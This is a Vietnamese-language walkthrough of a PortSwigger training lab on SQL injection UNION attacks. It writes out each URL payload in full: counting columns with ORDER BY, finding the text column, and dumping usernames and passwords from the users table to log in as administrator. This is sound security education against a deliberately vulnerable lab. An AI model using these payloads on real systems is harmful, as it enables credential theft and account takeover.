# Lab: SQL injection UNION attack, retrieving multiple values in a single column

### Link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
![Require of Lab](/Images/sql8.1.png)

Yêu cầu của bài lab là sử dụng kiểu tấn công UNION để lấy toàn bộ username và password trong bảng users; đăng nhập bằng thông tin của user administrator

Truy cập vào bài lab ta thấy đây là 1 website bán hàng, với từng danh mục như `Corporate gifts`, `Food & Drink`, `Gifts` và `Lifestyle`, `Pets`....
![Website](/Images/sql8.2.png)

Bước đầu tiên để giải quyết bài lab, ta phải xác định số cột được trả về là bao nhiêu. 
Sau khi tăng dần vị trí tương đối lên đến 3 thì thấy thông báo lỗi, do đó ta xác định được số cột được trả về là 2
> https://ac4b1fb51e6eb057c00080f2002b00f6.web-security-academy.net/filter?category=Pets`'+ORDER+BY+3--`

![Error of query](/Images/sql8.3.png)

Tiếp theo, là xác định từng cột trả về có chứa văn bản hay không.
Ta kiểm tra từng cột được trả về bằng cách chèn một vài ký tự trong từng cột và xem phản hồi
> https://ac4b1fb51e6eb057c00080f2002b00f6.web-security-academy.net/filter?category=Pets`'+UNION+SELECT+'abc',NULL--`

![Check column](/Images/sql8.4.png)

> https://ac4b1fb51e6eb057c00080f2002b00f6.web-security-academy.net/filter?category=Pets`'+UNION+SELECT+NULL,'abc'--`

![Check column](/Images/sql8.5.png)

Đã xác định được cột thứ 2 có chứa văn bản, cuối cùng là lấy thông tin các user từ bảng user như sau
> https://ac4b1fb51e6eb057c00080f2002b00f6.web-security-academy.net/filter?category=Pets`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`

![Info of users](/Images/sql8.6.png)

Để hoàn thành bài lab, ta dùng thông tin của user `administrator` để đăng nhập vào website
![Result](/Images/sql8.7.png)


<div align="right"> <i> Ngày 22 tháng 01 năm 2022 </i> </div>
